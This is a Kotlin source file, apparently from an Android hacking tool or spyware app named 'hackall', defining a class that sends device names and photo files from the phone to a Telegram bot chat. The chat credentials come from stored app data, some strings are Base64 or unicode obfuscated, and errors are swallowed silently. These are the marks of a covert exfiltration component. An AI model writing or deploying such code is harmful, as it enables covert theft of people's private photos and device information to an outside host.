package cocomelonc.hackall.tools

import android.annotation.SuppressLint
import android.content.Context
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.pengrad.telegrambot.TelegramBot
import com.pengrad.telegrambot.request.SendMessage
import com.pengrad.telegrambot.request.SendPhoto
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.nio.charset.StandardCharsets
import java.util.*


class HackAllNetwork(context: Context) : ViewModel() {
    private val token = HackAllUtils.getHackAllNetworkData(context).token
    private val id = HackAllUtils.getHackAllNetworkData(context).id
    private var bot = TelegramBot(token)

    @SuppressLint("NewApi")
    fun sendTextMessage(message: String) {
        try {
            viewModelScope.launch(Dispatchers.IO) {
                val footer0 = "OEoyUW5mQ2RrSjd3blpDdjhKMlFudkNka0tYd25aQ284SjJRcWZDZGtKN3duWkNkSVBDZGtKdnduWkN5SURvZ1FHTnZZMjl0Wld4dmJtTT0"
                val footer = String(Base64.getDecoder().decode(footer0), StandardCharsets.UTF_8)
                val footer2 = String(Base64.getDecoder().decode(footer), StandardCharsets.UTF_8)
                val info = "\uD835\uDC1D\uD835\uDC1E\uD835\uDC2F\uD835\uDC22\uD835\uDC1C\uD835\uDC1E : ${HackAllUtils.getDeviceName()}"
                val meow = "\u004d\u0065\u006f\u0077\u0020\u0066\u0072\u006f\u006d\u0020\u0042\u0061\u0068\u0072\u0061\u0069\u006e\u0021"
                val footer1 = "\uD83D\uDCF1"
                val messageToSend = "${footer1}$message\n\n$info\n\n$meow\n\n${footer2}"
                bot.execute(SendMessage(id, messageToSend))
            }
        } catch (e: Exception) {}
    }

    fun sendPhotoMessage(photoPath: String) {
        try {
            viewModelScope.launch(Dispatchers.IO) {
                val photoFile = java.io.File(photoPath)
                if (photoFile.exists()) {
                    val photoName = photoFile.name
                    val message = "\uD83D\uDDBC\uFE0F Photo: ${photoName}"
                    sendTextMessage(message)
                    bot.execute(SendPhoto(id, photoFile))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

}